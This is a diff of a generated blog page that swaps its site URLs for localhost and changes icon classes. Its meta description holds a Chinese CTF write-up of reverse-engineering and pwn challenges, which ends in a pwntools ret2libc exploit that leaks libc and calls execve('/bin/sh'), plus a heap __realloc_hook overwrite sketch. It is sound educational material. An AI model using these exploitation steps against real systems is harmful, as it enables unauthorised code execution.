@@ -20,26 +20,26 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="My way, though far away">
 <meta property="og:title" content="安恒一月赛二进制题目题解">
-<meta property="og:url" content="https://zjgcjy.github.io/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html">
+<meta property="og:url" content="http://localhost:4000/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html">
 
 
   <meta property="og:description" content="  好久没打安恒的月赛了，碰巧今天有空，就做了下二进制的几道题目，总体难度不是很大，还好没有触及到我的知识盲区Orz。reverse来玩蛇吧这题给了2个文件，一个exe和一个pyc，结合图标和题目意思，我好像明白了什么，估计是python的逆向题。以前也做过这种类型的题，但是很久没做，有点生疏了，主要是要知道这个程序是python写的，并且用打包器制作成可执行文件的。直接上网搜索python打包器就能找到这个工具的名字叫做PyInstaller，根据Pcat的博客描述，我们可以使用PyInstaller Extractor来提取可执行文件的资源内容。这个脚本网上也很容易能下载。需要注意的是，当我们开始提取文件的时候，需要和编写的python的程序版本一致，由于我本机只有python2的环境，提取资源的时候，就会发生错误，如下图所示。由于PyInstaller Extractor兼容python2和3，在python3环境下即可提取资源进行逆向分析。这样我们就能提取到一堆文件了，如下表所示。 _bz2.pyd*                                             _hashlib.pyd*                                         _lzma.pyd*                                            _socket.pyd*                                          _ssl.pyd*                                             AnhengRe                                              AnhengRe.exe.manifest                                 api-ms-win-core-console-l1-1-0.dll*                   api-ms-win-core-datetime-l1-1-0.dll*                  api-ms-win-core-debug-l1-1-0.dll*                     api-ms-win-core-errorhandling-l1-1-0.dll*             api-ms-win-core-file-l1-1-0.dll*                      api-ms-win-core-file-l1-2-0.dll*                      api-ms-win-core-file-l2-1-0.dll*                      api-ms-win-core-handle-l1-1-0.dll*                    api-ms-win-core-heap-l1-1-0.dll*                      api-ms-win-core-interlocked-l1-1-0.dll*               api-ms-win-core-libraryloader-l1-1-0.dll*             api-ms-win-core-localization-l1-2-0.dll*              api-ms-win-core-memory-l1-1-0.dll*                    api-ms-win-core-namedpipe-l1-1-0.dll*                 api-ms-win-core-processenvironment-l1-1-0.dll*        api-ms-win-core-processthreads-l1-1-0.dll*            api-ms-win-core-processthreads-l1-1-1.dll*            api-ms-win-core-profile-l1-1-0.dll*                   api-ms-win-core-rtlsupport-l1-1-0.dll*                api-ms-win-core-string-l1-1-0.dll*                    api-ms-win-core-synch-l1-1-0.dll*                     api-ms-win-core-synch-l1-2-0.dll*                     api-ms-win-core-sysinfo-l1-1-0.dll*                   api-ms-win-core-timezone-l1-1-0.dll*                  api-ms-win-core-util-l1-1-0.dll*                      api-ms-win-crt-conio-l1-1-0.dll*                      api-ms-win-crt-convert-l1-1-0.dll*                    api-ms-win-crt-environment-l1-1-0.dll*                api-ms-win-crt-filesystem-l1-1-0.dll*                 api-ms-win-crt-heap-l1-1-0.dll*                       api-ms-win-crt-locale-l1-1-0.dll*                     api-ms-win-crt-math-l1-1-0.dll*                       api-ms-win-crt-process-l1-1-0.dll*                    api-ms-win-crt-runtime-l1-1-0.dll*                    api-ms-win-crt-stdio-l1-1-0.dll*                      api-ms-win-crt-string-l1-1-0.dll*                     api-ms-win-crt-time-l1-1-0.dll*                       api-ms-win-crt-utility-l1-1-0.dll*                    base_library.zip                                      out00-PYZ.pyz                                         out00-PYZ.pyz_extracted/                              pyexpat.pyd*                                          pyiboot01_bootstrap                                   pyimod01_os_path                                      pyimod02_archive                                      pyimod03_importers                                   &#39;pyi-windows-manifest-filename AnhengRe.exe.manifest&#39;  python36.dll*                                         select.pyd*                                           struct                                                ucrtbase.dll*                                         unicodedata.pyd*                                      VCRUNTIME140.dll*                                    那么接下来我们需要知道哪些是外部的库函数，哪些是程序本身的部分。那么很明显，dll都是windows下的动态链接库，而pyd也是python的动态链接库（python dll），除去这些文件和一些清单文件外，再结合文件名，很容易就能找到AnhengRe这个文件，应该就是我们所需要的。接下来这一步就是分析这个文件是什么格式。一般的思路就是通过file命令或者binwalk进行解析，再或者通过strings来查看字符串。如下所示。$ file AnhengReAnhengRe: data$ strings AnhengRe  Tell me your name?z Tell me your pasw   9f1ff1e8b5b91110    c4e21c11a2412       wrong               AnHeng              Congratulations     flag                pause               flag{               no,)                input               range               print               system              AnhengRe.py         &lt;module&gt;            从我自己角度来说，我立马判断这就是一个pyc程序了，因为这些字符串特征很明显，没有加密混淆，也出现了AnhengRe.py和module这样的字样。但是用010editor分析后发现文件头不满足pyc的格式，于是我猜想头部数据被修改了。经过多次实验和对比，最终发现头部的12字节被剔除了。然后进行补齐即可，忽略时间戳。33 0D 0D 0A 00 00 00 00 00 00 00 00最后我们即可通过uncompyle6等反编译工具来获得python的源码，得到源码如下：#!/usr/bin/env python# encoding: utf-8import osn1 = input(&#39;Tell me your name?&#39;)n2 = input(&#39;Tell me your pasw&#39;)n11 = chr(ord(n1[0]) + 12)s = &#39;&#39;st3 = &#39;51e&#39;st2 = &#39;9f1ff1e8b5b91110&#39;st1 = &#39;c4e21c11a2412&#39;st0 = &#39;wrong&#39;if n11 + &#39;AnHeng&#39; == n2:    for i in range(0, 4):        s += st1[3 - i]        print(&#39;Congratulations&#39;)    ts = st2[0] + st3 + st2[1] + s    print(&#39;flag{&#39; + st3[:1] + st1 + st2 + st3[-2:] + &#39;}&#39;)    os.system(&#39;pause&#39;)else:    print(&#39;no,&#39; + st0)这段代码再简单也不为过了，直接将判断条件删除再运行即可获得flag。old-drive逆向第二题，本来看题目我以为是驱动题，但实际不是。主函数逻辑如下：首先对输入长度进行检测，很容易判断是40，然后进行了一段smc，即self-modify-code，自修改代码，也是比较常见的样式，即常量异或。这段smc用于解密一段函数，这个函数在最后的比较中是有用到的。接下来将输入前5字节和flag{对比，没什么好说的，最后进入sub4010b0这个函数中。其中主函数中的smc解密脚本如下（idapython）：addr = 0x401000for i in xrange(0x401260-addr):    PatchByte(addr+i, Byte(addr+i) ^ 0xbb)第二个check逻辑如下： v3 = byte_4021B8; do {   v4 = (unsigned __int8)*v3++;   if ( ((char)a2[v2] ^ 0x86) != v4 )          LABEL_12:     exit(0);   ++v2; }也是一个比较常见的密文比较，对应的解密脚本如下：addr = 0x4021b8flag = &quot;flag{&quot;for i in xrange(6):  flag += chr(Byte(addr+i) ^ 0x86)然后进入第三个check逻辑中，如下图所示：熟悉base64编码的同学一般能一眼看出来这段算法，就是一个正常的base64编码，编码表没任何变化，要想快速识别base64算法需要对该算法比较熟悉。首先是3×8=4×6，即3个8bit的字符转换成4个6bit的字符，然后查表，每一组分成4份，每一份分别是每一组的高6bit，次高6bit，次底6bit和最低的6bit。还不熟悉的同学可以自己编程，再逆向分析其实现。所以这段算法对应的解密脚本如下：flag += b64decode(&quot;c19zbWNf&quot;)然后进入最后一个check逻辑中，如下图所示。首先定义了一段奇怪的字符串，然后载入输入的后半段，然后进入一个switch语句中，循环检测，最后判断是否是#，且循环中每一步的下标对应的字符只能是空格，否则就失败。所以这就是一个迷宫算法了，迷宫的入口点是在字符串偏移8的位置上，也就是g所处的位置，然后2aqw分别代表上下左右进行移动。g +    ++ + ++ ++ + #+ ++ ++++ ++ ++++ ++      +由于这个迷宫很小，所以我们很容易就能得到答案了，最后我们再将几个部分练起来即可得到整个的flag。pwnmycardpwn第一个题主要堆上的问题，首先主函数有4个功能，分别是create、edit、delete和exit，如下图所示，常见的清单型pwn题。关键的漏洞主要是由于在edit过程中，没有对分配的块大小进行检测，如果重新设置的大小比原来的大，会导致堆溢出的情况发生。由于程序中开启了所有的保护，比较常见的方式是通过hook来进行漏洞利用，那么我们首先要泄露出libc的基地址。Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled那么在这个程序中我们的确是能泄露出libc的基地址的，如下图所示。由于write函数设置了固定长度的输入，而堆块上也会存在libc的地址，通过泄露该地址，我们就能拿到libc的地址，绕过保护，代码如下：libc = ELF(&#39;libc.so.6&#39;)realloc_hook = libc.symbols[&#39;__realloc_hook&#39;]libc.address = delete(3) - realloc_hook - 240然后我们将堆块的地址指向hook函数的自动，进一步再将hook指向system的地址，最后调用realloc即可getshell。rrr这个题的漏洞主要是栈缓冲区溢出，如下图所示，读取字节过长导致栈溢出，所以能够劫持控制流。那么这个题方法有很多，由于没有canary检测，无论是stack pivot来进行栈迁移执行shellcode还是传统的ret2libc都行，需要注意的是这里程序中有个随机值异或的过程，最简单的方式就是控制strlen的返回值来防止后续字节被修改。我自己还是通过ret2libc来实现的，通过puts函数来打印出got表项的地址，然后计算出偏移量，返回到主函数再进行一次栈溢出，返回到system或execve即可getshell。s.recv()payload = flat([cyclic(48),0, elf.plt[&#39;puts&#39;], 0x8048480, elf.got[&#39;puts&#39;]])s.send(payload)puts_addr = u32(s.recvuntil(&quot;\xf7&quot;).ljust(4, &#39;\x00&#39;))log.success(&quot;puts_addr -&gt; {:#x}&quot;.format(puts_addr))s.recv()libc.address = puts_addr - libc.symbols[&#39;puts&#39;]log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))payload = flat([cyclic(48),0, libc.symbols[&#39;execve&#39;], 0x8048480,next(libc.search(&quot;/bin/sh&quot;)),0,0])s.send(payload)#s.recv()s.interactive()">
 
 
 
-  <meta property="og:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
 
 
 
   <meta name="twitter:site" content="@zjgcjy">
   <meta name="twitter:title" content="安恒一月赛二进制题目题解">
   <meta name="twitter:description" content="  好久没打安恒的月赛了，碰巧今天有空，就做了下二进制的几道题目，总体难度不是很大，还好没有触及到我的知识盲区Orz。reverse来玩蛇吧这题给了2个文件，一个exe和一个pyc，结合图标和题目意思，我好像明白了什么，估计是python的逆向题。以前也做过这种类型的题，但是很久没做，有点生疏了，主要是要知道这个程序是python写的，并且用打包器制作成可执行文件的。直接上网搜索python打包器就能找到这个工具的名字叫做PyInstaller，根据Pcat的博客描述，我们可以使用PyInstaller Extractor来提取可执行文件的资源内容。这个脚本网上也很容易能下载。需要注意的是，当我们开始提取文件的时候，需要和编写的python的程序版本一致，由于我本机只有python2的环境，提取资源的时候，就会发生错误，如下图所示。由于PyInstaller Extractor兼容python2和3，在python3环境下即可提取资源进行逆向分析。这样我们就能提取到一堆文件了，如下表所示。 _bz2.pyd*                                             _hashlib.pyd*                                         _lzma.pyd*                                            _socket.pyd*                                          _ssl.pyd*                                             AnhengRe                                              AnhengRe.exe.manifest                                 api-ms-win-core-console-l1-1-0.dll*                   api-ms-win-core-datetime-l1-1-0.dll*                  api-ms-win-core-debug-l1-1-0.dll*                     api-ms-win-core-errorhandling-l1-1-0.dll*             api-ms-win-core-file-l1-1-0.dll*                      api-ms-win-core-file-l1-2-0.dll*                      api-ms-win-core-file-l2-1-0.dll*                      api-ms-win-core-handle-l1-1-0.dll*                    api-ms-win-core-heap-l1-1-0.dll*                      api-ms-win-core-interlocked-l1-1-0.dll*               api-ms-win-core-libraryloader-l1-1-0.dll*             api-ms-win-core-localization-l1-2-0.dll*              api-ms-win-core-memory-l1-1-0.dll*                    api-ms-win-core-namedpipe-l1-1-0.dll*                 api-ms-win-core-processenvironment-l1-1-0.dll*        api-ms-win-core-processthreads-l1-1-0.dll*            api-ms-win-core-processthreads-l1-1-1.dll*            api-ms-win-core-profile-l1-1-0.dll*                   api-ms-win-core-rtlsupport-l1-1-0.dll*                api-ms-win-core-string-l1-1-0.dll*                    api-ms-win-core-synch-l1-1-0.dll*                     api-ms-win-core-synch-l1-2-0.dll*                     api-ms-win-core-sysinfo-l1-1-0.dll*                   api-ms-win-core-timezone-l1-1-0.dll*                  api-ms-win-core-util-l1-1-0.dll*                      api-ms-win-crt-conio-l1-1-0.dll*                      api-ms-win-crt-convert-l1-1-0.dll*                    api-ms-win-crt-environment-l1-1-0.dll*                api-ms-win-crt-filesystem-l1-1-0.dll*                 api-ms-win-crt-heap-l1-1-0.dll*                       api-ms-win-crt-locale-l1-1-0.dll*                     api-ms-win-crt-math-l1-1-0.dll*                       api-ms-win-crt-process-l1-1-0.dll*                    api-ms-win-crt-runtime-l1-1-0.dll*                    api-ms-win-crt-stdio-l1-1-0.dll*                      api-ms-win-crt-string-l1-1-0.dll*                     api-ms-win-crt-time-l1-1-0.dll*                       api-ms-win-crt-utility-l1-1-0.dll*                    base_library.zip                                      out00-PYZ.pyz                                         out00-PYZ.pyz_extracted/                              pyexpat.pyd*                                          pyiboot01_bootstrap                                   pyimod01_os_path                                      pyimod02_archive                                      pyimod03_importers                                   &#39;pyi-windows-manifest-filename AnhengRe.exe.manifest&#39;  python36.dll*                                         select.pyd*                                           struct                                                ucrtbase.dll*                                         unicodedata.pyd*                                      VCRUNTIME140.dll*                                    那么接下来我们需要知道哪些是外部的库函数，哪些是程序本身的部分。那么很明显，dll都是windows下的动态链接库，而pyd也是python的动态链接库（python dll），除去这些文件和一些清单文件外，再结合文件名，很容易就能找到AnhengRe这个文件，应该就是我们所需要的。接下来这一步就是分析这个文件是什么格式。一般的思路就是通过file命令或者binwalk进行解析，再或者通过strings来查看字符串。如下所示。$ file AnhengReAnhengRe: data$ strings AnhengRe  Tell me your name?z Tell me your pasw   9f1ff1e8b5b91110    c4e21c11a2412       wrong               AnHeng              Congratulations     flag                pause               flag{               no,)                input               range               print               system              AnhengRe.py         &lt;module&gt;            从我自己角度来说，我立马判断这就是一个pyc程序了，因为这些字符串特征很明显，没有加密混淆，也出现了AnhengRe.py和module这样的字样。但是用010editor分析后发现文件头不满足pyc的格式，于是我猜想头部数据被修改了。经过多次实验和对比，最终发现头部的12字节被剔除了。然后进行补齐即可，忽略时间戳。33 0D 0D 0A 00 00 00 00 00 00 00 00最后我们即可通过uncompyle6等反编译工具来获得python的源码，得到源码如下：#!/usr/bin/env python# encoding: utf-8import osn1 = input(&#39;Tell me your name?&#39;)n2 = input(&#39;Tell me your pasw&#39;)n11 = chr(ord(n1[0]) + 12)s = &#39;&#39;st3 = &#39;51e&#39;st2 = &#39;9f1ff1e8b5b91110&#39;st1 = &#39;c4e21c11a2412&#39;st0 = &#39;wrong&#39;if n11 + &#39;AnHeng&#39; == n2:    for i in range(0, 4):        s += st1[3 - i]        print(&#39;Congratulations&#39;)    ts = st2[0] + st3 + st2[1] + s    print(&#39;flag{&#39; + st3[:1] + st1 + st2 + st3[-2:] + &#39;}&#39;)    os.system(&#39;pause&#39;)else:    print(&#39;no,&#39; + st0)这段代码再简单也不为过了，直接将判断条件删除再运行即可获得flag。old-drive逆向第二题，本来看题目我以为是驱动题，但实际不是。主函数逻辑如下：首先对输入长度进行检测，很容易判断是40，然后进行了一段smc，即self-modify-code，自修改代码，也是比较常见的样式，即常量异或。这段smc用于解密一段函数，这个函数在最后的比较中是有用到的。接下来将输入前5字节和flag{对比，没什么好说的，最后进入sub4010b0这个函数中。其中主函数中的smc解密脚本如下（idapython）：addr = 0x401000for i in xrange(0x401260-addr):    PatchByte(addr+i, Byte(addr+i) ^ 0xbb)第二个check逻辑如下： v3 = byte_4021B8; do {   v4 = (unsigned __int8)*v3++;   if ( ((char)a2[v2] ^ 0x86) != v4 )          LABEL_12:     exit(0);   ++v2; }也是一个比较常见的密文比较，对应的解密脚本如下：addr = 0x4021b8flag = &quot;flag{&quot;for i in xrange(6):  flag += chr(Byte(addr+i) ^ 0x86)然后进入第三个check逻辑中，如下图所示：熟悉base64编码的同学一般能一眼看出来这段算法，就是一个正常的base64编码，编码表没任何变化，要想快速识别base64算法需要对该算法比较熟悉。首先是3×8=4×6，即3个8bit的字符转换成4个6bit的字符，然后查表，每一组分成4份，每一份分别是每一组的高6bit，次高6bit，次底6bit和最低的6bit。还不熟悉的同学可以自己编程，再逆向分析其实现。所以这段算法对应的解密脚本如下：flag += b64decode(&quot;c19zbWNf&quot;)然后进入最后一个check逻辑中，如下图所示。首先定义了一段奇怪的字符串，然后载入输入的后半段，然后进入一个switch语句中，循环检测，最后判断是否是#，且循环中每一步的下标对应的字符只能是空格，否则就失败。所以这就是一个迷宫算法了，迷宫的入口点是在字符串偏移8的位置上，也就是g所处的位置，然后2aqw分别代表上下左右进行移动。g +    ++ + ++ ++ + #+ ++ ++++ ++ ++++ ++      +由于这个迷宫很小，所以我们很容易就能得到答案了，最后我们再将几个部分练起来即可得到整个的flag。pwnmycardpwn第一个题主要堆上的问题，首先主函数有4个功能，分别是create、edit、delete和exit，如下图所示，常见的清单型pwn题。关键的漏洞主要是由于在edit过程中，没有对分配的块大小进行检测，如果重新设置的大小比原来的大，会导致堆溢出的情况发生。由于程序中开启了所有的保护，比较常见的方式是通过hook来进行漏洞利用，那么我们首先要泄露出libc的基地址。Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled那么在这个程序中我们的确是能泄露出libc的基地址的，如下图所示。由于write函数设置了固定长度的输入，而堆块上也会存在libc的地址，通过泄露该地址，我们就能拿到libc的地址，绕过保护，代码如下：libc = ELF(&#39;libc.so.6&#39;)realloc_hook = libc.symbols[&#39;__realloc_hook&#39;]libc.address = delete(3) - realloc_hook - 240然后我们将堆块的地址指向hook函数的自动，进一步再将hook指向system的地址，最后调用realloc即可getshell。rrr这个题的漏洞主要是栈缓冲区溢出，如下图所示，读取字节过长导致栈溢出，所以能够劫持控制流。那么这个题方法有很多，由于没有canary检测，无论是stack pivot来进行栈迁移执行shellcode还是传统的ret2libc都行，需要注意的是这里程序中有个随机值异或的过程，最简单的方式就是控制strlen的返回值来防止后续字节被修改。我自己还是通过ret2libc来实现的，通过puts函数来打印出got表项的地址，然后计算出偏移量，返回到主函数再进行一次栈溢出，返回到system或execve即可getshell。s.recv()payload = flat([cyclic(48),0, elf.plt[&#39;puts&#39;], 0x8048480, elf.got[&#39;puts&#39;]])s.send(payload)puts_addr = u32(s.recvuntil(&quot;\xf7&quot;).ljust(4, &#39;\x00&#39;))log.success(&quot;puts_addr -&gt; {:#x}&quot;.format(puts_addr))s.recv()libc.address = puts_addr - libc.symbols[&#39;puts&#39;]log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))payload = flat([cyclic(48),0, libc.symbols[&#39;execve&#39;], 0x8048480,next(libc.search(&quot;/bin/sh&quot;)),0,0])s.send(payload)#s.recv()s.interactive()">
-  <meta name="twitter:url" content="https://zjgcjy.github.io/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html">
+  <meta name="twitter:url" content="http://localhost:4000/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html">
 
   
     <meta name="twitter:card" content="summary">
     
-      <meta name="twitter:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
     
   
 
@@ -58,7 +58,7 @@
   
 
 
-<link rel="canonical" href="https://zjgcjy.github.io/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html">
+<link rel="canonical" href="http://localhost:4000/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html">
 
 
 
@@ -69,7 +69,7 @@
     
       "@type": "Person",
       "name": "Blogger",
-      "url": "https://zjgcjy.github.io/",
+      "url": "http://localhost:4000/",
       "sameAs": ["https://twitter.com/","https://github.com/"]
     
   }
@@ -193,7 +193,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="https://zjgcjy.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -263,26 +263,26 @@
     <ul class="author__urls social-icons">
       
         <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
-          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
+          <i class="fa fa-map-marker" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
         </li>
       
 
       
         
           
-            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i> Website</a></li>
+            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fa fa-link" aria-hidden="true"></i> Website</a></li>
           
         
           
-            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fa fa-envelope-square" aria-hidden="true"></i> Email</a></li>
           
         
           
-            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
           
         
           
-            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
           
         
       
@@ -666,7 +666,7 @@ PIE:      PIE enabled
   
 
   <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <strong><i class="fa fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
       
@@ -680,7 +680,7 @@ PIE:      PIE enabled
 
 
         
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-26T16:15:00+08:00">January 26, 2019</time></p>
+          <p class="page__date"><strong><i class="fa fa-calendar" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-26T16:15:00+08:00">January 26, 2019</time></p>
         
       </footer>
 
@@ -689,11 +689,11 @@ PIE:      PIE enabled
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3%20https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-01%2F%25E5%25AE%2589%25E6%2581%2592%25E4%25B8%2580%25E6%259C%2588%25E8%25B5%259B%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E9%25A2%2598%25E7%259B%25AE%25E9%25A2%2598%25E8%25A7%25A3.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-01%2F%25E5%25AE%2589%25E6%2581%2592%25E4%25B8%2580%25E6%259C%2588%25E8%25B5%259B%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E9%25A2%2598%25E7%259B%25AE%25E9%25A2%2598%25E8%25A7%25A3.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fa fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-01%2F%25E5%25AE%2589%25E6%2581%2592%25E4%25B8%2580%25E6%259C%2588%25E8%25B5%259B%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E9%25A2%2598%25E7%259B%25AE%25E9%25A2%2598%25E8%25A7%25A3.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-01%2F%25E5%25AE%2589%25E6%2581%2592%25E4%25B8%2580%25E6%259C%2588%25E8%25B5%259B%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E9%25A2%2598%25E7%259B%25AE%25E9%25A2%2598%25E8%25A7%25A3.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fa fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-01%2F%25E5%25AE%2589%25E6%2581%2592%25E4%25B8%2580%25E6%259C%2588%25E8%25B5%259B%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E9%25A2%2598%25E7%259B%25AE%25E9%25A2%2598%25E8%25A7%25A3.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-01%2F%25E5%25AE%2589%25E6%2581%2592%25E4%25B8%2580%25E6%259C%2588%25E8%25B5%259B%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E9%25A2%2598%25E7%259B%25AE%25E9%25A2%2598%25E8%25A7%25A3.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -919,16 +919,16 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
       
         
-          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
         
       
         
-          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
         
       
     
 
-    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    <li><a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i> Feed</a></li>
   </ul>
 </div>
 
@@ -939,7 +939,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
 
     
   <script src="/assets/js/main.min.js"></script>
-  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+  <script src="https://use.fontawesome.com/1d25d6ba93.js"></script>
 
 
 
@@ -954,7 +954,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
   <script>
     var disqus_config = function () {
-      this.page.url = "https://zjgcjy.github.io/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.url = "http://localhost:4000/posts/2019-01/%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E8%B5%9B%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3.html";  // Replace PAGE_URL with your page's canonical URL variable
       this.page.identifier = "/posts/2019-01/安恒一月赛二进制题目题解"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     (function() { // DON'T EDIT BELOW THIS LINE
